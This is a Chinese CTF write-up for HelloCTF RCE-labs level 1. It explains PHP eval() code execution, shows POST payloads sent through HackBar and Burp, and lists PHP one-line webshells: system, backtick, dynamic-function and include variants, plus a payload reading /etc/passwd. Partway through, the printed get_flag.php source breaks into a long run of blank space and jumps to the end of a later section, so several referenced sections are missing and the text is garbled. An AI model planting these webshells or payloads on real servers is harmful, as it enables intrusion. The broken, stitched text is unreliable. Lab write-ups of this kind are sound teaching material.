---
title: HelloCTF RCE-labs Level 1 题解：一句话木马与代码执行
date: 2026-10-07
pinned: false
description: "HelloCTF RCE-labs 靶场第一关通关记录：从 eval() 一句话木马讲清代码执行与命令执行的区别，含完整 payload、Content-Type 要点与同类危险函数全景图。"
tags: [ctf, web, WriteUp]
categories: [web]
draft: false
cover: /hero/bg-03-s3.jpg
---



# HelloCTF RCE-labs 第一关 · 一句话木马与代码执行 —— Writeup

| 项目 | 内容 |
|---|---|
| 靶场 | HelloCTF RCE 靶场（github.com/ProbiusOfficial/RCE-labs，作者 探姬） |
| 题型 | Web / PHP 代码执行（Code Execution / RCE） |
| 目标 | http://80-566505c7-d9d5-4295-bb5d-72beeafaad5f.challenge.ctfplus.cn/ |
| 工具 | 新版 HackBar（DevTools 内置版）、Burp Suite Community v2026.8 |
| 结果 | 拿到 HelloCTF{...}（以实际回显为准） |

---

## 一、题目

打开靶机，页面直接把自己的源码打印了出来（这是 `highlight_file(__FILE__)` 的效果）：

```php
<?php
include ("get_flag.php");
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date: 2024-08-11 14:34
# @Repo: github.com/ProbiusOfficial/RCE-labs
# @email: admin@hello-ctf.com
# @link: hello-ctf.com

—— HelloCTF —— RCE靶场 ：一句话木马和代码执行 ——

【代码执行(Code Execution)】 在某个语言中，通过一些方式(通常为函数或者方法调用)执行该语言的任意代码的行为，如PHP中的 eval() 函数或Python中的 exec() 函数。

当漏洞入口点可以执行任意代码时，我们称其为代码执行漏洞 —— 这种漏洞包含了通过语言中对系统命令的函数来执行系统命令的情况，比如 eval("system('cat /etc/passwd');");，也被归为代码执行漏洞。

我们平时最常见的一句话木马就用的 eval() 函数，如下所示（一般情况下，为了接收更长的Payload，我们一般对可控参数使用POST传参）

try POST:
    a=echo "Hello,World!";

*/
eval($_POST['a']);
highlight_file(__FILE__);
?>
```

题面给了两个关键提示：

1. `try POST: a=echo "Hello,World!";` —— 用 **POST** 方式、参数名为 **a**、值是 PHP 代码
2. 可控参数 `a` 会被送进 `eval()`

---

## 二、题目分析

### 2.1 逐行解读

| 代码 | 含义 |
|---|---|
| `include("get_flag.php")` | 同作用域引入另一个文件 —— flag 的来路大概率在里面 |
| `/* ... */` 大段注释 | 出题人写的教学文案，**不是要执行的代码** |
| `eval($_POST['a'])` | **漏洞本体**：把 POST 参数 `a` 当 PHP 代码执行 |
| `highlight_file(__FILE__)` | 打印本文件源码 —— 所以页面才会把源码摊开给你看 |

### 2.2 漏洞定位：一句话木马

`eval($_POST['a'])` 本身就是最经典的**一句话木马**。它危险的地方在于：

> **`eval()` 执行的是"代码"，不是"数据"。**

普通写法 `echo $_POST['a']` 会把你输入的东西当**字符串**原样输出；
而 `eval($_POST['a'])` 会把你输入的东西**当程序跑一遍**：

```
你输入的字符串  ==  服务器将要执行的 PHP 代码
```

于是"可控参数"直接变成了"任意代码执行"。

### 2.3 代码执行 vs 命令执行

| 类型 | 谁在执行 | 典型函数 |
|---|---|---|
| **代码执行** | 该**语言**的解析器（Zend 引擎） | `eval()` `assert()` `call_user_func()` |
| **命令执行** | 操作**系统**的 shell | `system()` `exec()` `shell_exec()` |

两者的桥梁：代码执行里可以调用命令执行 ——
`eval("system('cat /etc/passwd');")` 这种也归为代码执行漏洞（题面注释里特意点明了这一点）。

---

## 三、解题过程

### 3.0 发 payload 的三条铁律

动手之前先记住这三点，能省掉 90% 的坑：

| # | 规则 | 违反的后果 |
|---|---|---|
| 1 | payload 里**不要写 PHP 开闭标签** | `eval` 内部已经是 PHP 模式，混进标签会报 `syntax error, unexpected '<'` |
| 2 | 语句结尾**必须带分号** | 报 `syntax error, unexpected end of file` |
| 3 | 必须**用 POST 传参**，并带上 `Content-Type: application/x-www-form-urlencoded` | `$_POST['a']` 为空 → `eval()` 空转 → 页面毫无反应 |

第 3 条最容易忽略，原理见 **4.2 节**。

---

### 3.1 打通入口（验证漏洞）

payload 用题面给的示例：

```
a=echo "Hello,World!";
```

页面回显 `Hello,World!` 即证明漏洞是活的。

#### 方式一：HackBar（新版 DevTools 内置版）

> 注意版本差异：新版 HackBar 是**开发者工具里的一个页签**，界面是下方这排大写按钮，
> 与老的 HackBar V2 侧边栏版完全不同。
>
> ```
> LOAD | SPLIT | EXECUTE | TEST | SQLi | XSS | LFI | SSRF
> URL 文本框 -> [开关] Use POST method + [下拉] enctype -> Body 文本框 -> MODIFY HEADER
> ```

| 步骤 | 操作 | 界面位置 |
|---|---|---|
| 1 | 浏览器打开靶机页面，按 `F12`，点 **HackBar** 页签 | DevTools 顶部 |
| 2 | 点 **LOAD** 把当前页 URL 自动填进 URL 框（已填好可跳过） | 面板顶部 |
| 3 | **拨开 `Use POST method` 开关** —— 最关键的一步，不开就是 GET | 开关行 |
| 4 | `enctype` 下拉保持 `application/x-www-form-urlencoded` | 开关行右侧 |
| 5 | **Body** 文本框填入 `a=echo "Hello,World!";` | Body 区域 |
| 6 | 点 **EXECUTE**（是大写，不叫 "Execute"） | 面板右上 |

`SPLIT / TEST / SQLi / XSS / LFI / SSRF` 这几个按钮本题全用不上，不用去点。

> **为什么 HackBar 里不用操心 Content-Type？**
> 因为第 4 步那个 `enctype` 下拉框，干的就是设置 `Content-Type` 请求头。
> 插件在背后替你加了，所以你无感。Burp 是裸改报文，没有这个下拉框，一切得手写。

#### 方式二：Burp Suite

> 环境：Burp Suite Community Edition **v2026.8**（新版 UI）

| 步骤 | 操作 | 位置 |
|---|---|---|
| 1 | 点 **Open browser**（内置浏览器，免配代理、免装证书） | `Proxy -> Intercept` 页右上角 |
| 2 | 在内置浏览器访问靶机，等页面完整加载 | 内置浏览器 |
| 3 | 找到那条 `GET /` 请求，右键 **Send to Repeater**（`Ctrl+R`） | `Proxy -> HTTP history` |
| 4 | 在 Repeater **左栏 Request 文本框**里改三处（见下表） | Repeater |
| 5 | 点 **Send**，右栏 Response 看回显 | Repeater 左上 |

**第 4 步的三处改动**：

| # | 改动 | 说明 |
|---|---|---|
| 1 | 第 1 行 `GET / HTTP/1.1` 改成 `POST / HTTP/1.1` | Burp **不会自动换方法**，必须手改 |
| 2 | 在 `Host:` 下新增一行 `Content-Type: application/x-www-form-urlencoded` | 见 4.2 节，不加则 `$_POST` 为空 |
| 3 | 头与 body 之间**留一整行真正的空行**，然后写 `a=echo "Hello,World!";` | HTTP 协议规定的分隔符，不能少 |

改完后的完整请求报文：

```http
POST / HTTP/1.1
Host: 80-566505c7-d9d5-4295-bb5d-72beeafaad5f.challenge.ctfplus.cn
Content-Type: application/x-www-form-urlencoded
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Connection: keep-alive

a=echo "Hello,World!";
```

要点：

- 原有的 `Accept` / `User-Agent` / `Connection` 等头**保留不动**即可，不影响
- `Content-Length` **不用自己算**，Burp 点 Send 时会自动重算
- 若点 Send 后 Response 毫无变化，切到 **Raw** 视图确认那个空行还在
  （Pretty 视图有时会把空行"藏"起来看不出来）

回显 `Hello,World!` —— 漏洞确认可用。

---

### 3.2 信息收集：读 get_flag.php 的源码

页面第一行 `include("get_flag.php")` 已经证明该文件就在当前目录、PHP 可读；
而页面自己就在用 `highlight_file()`，说明这个函数没被禁用 —— 直接拿来读它：

```
a=highlight_file("get_flag.php");
```

> `show_source()` 是 `highlight_file()` 的别名，效果完全一样。

回显拿到源码：

```php
<?php
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ?>      // 最经典，本题就是它
<?php assert($_POST['a']); ?>     // 老版本才有用
<?php system($_GET['c']); ?>      // 命令马
<?= `$_GET['c']`; ?>              // 反引号马，最短
<?php $_GET['f']($_GET['a']); ?>  // 动态函数马
<?php include $_GET['f']; ?>      // 包含马
```

再往上还有**免杀方向**的无字母数字马（异或、取反、自增构造字符串），属于另一个话题了。

### 5.5 其它语言的"同名兄弟"

| 语言 | 代码执行 | 命令执行 |
|---|---|---|
| Python | `eval()` `exec()` | `os.system` / `subprocess` / `pickle.loads`（反序列化 RCE） |
| JavaScript / Node | `eval()` `new Function()` | `child_process.exec` |
| Java | 无 | `Runtime.exec()` / `ProcessBuilder` |

### 5.6 找 sink 的通用排查链

1. **找入口** —— 用户输入从哪进（GET / POST / Cookie / 请求头 / 上传的文件）
2. **找 sink** —— 源码里 grep 上述这些危险函数名
3. **判版本** —— `/e`、`assert` 字符串执行这些老特性还灵不灵（`phpinfo()` 最直接）
4. **看过滤** —— 黑名单拦了什么、漏了什么（大小写、编码、关键字拆分）
5. **查禁用** —— `phpinfo()` 的 `disable_functions` 段，看目标函数是否被关掉

---

## 六、总结

1. `eval($_POST['a'])` 就是一句话木马 —— 用户输入直接被当代码执行，最典型的代码执行漏洞。
2. 发 payload 三件事：用 POST、带 `Content-Type: application/x-www-form-urlencoded`、结尾带分号。
3. `eval` 里不要写 PHP 开闭标签 —— 它已经在 PHP 模式里了。
4. `include` 与 `eval` 共享作用域 —— 被包含文件产生的全局变量在 `eval` 里可直接读取，所以 `a=echo $flag;` 是最短解。
5. 工具只是外壳：HackBar 用 `enctype` 下拉框替你加 `Content-Type`；Burp 裸改报文，一切都得手写。
6. RCE-labs 后续关卡只是把 sink 换成 `assert` / `system` / `call_user_func` 之类，
   流程完全一样：**打通入口 → 读源码 → 按源码取 flag**。

---

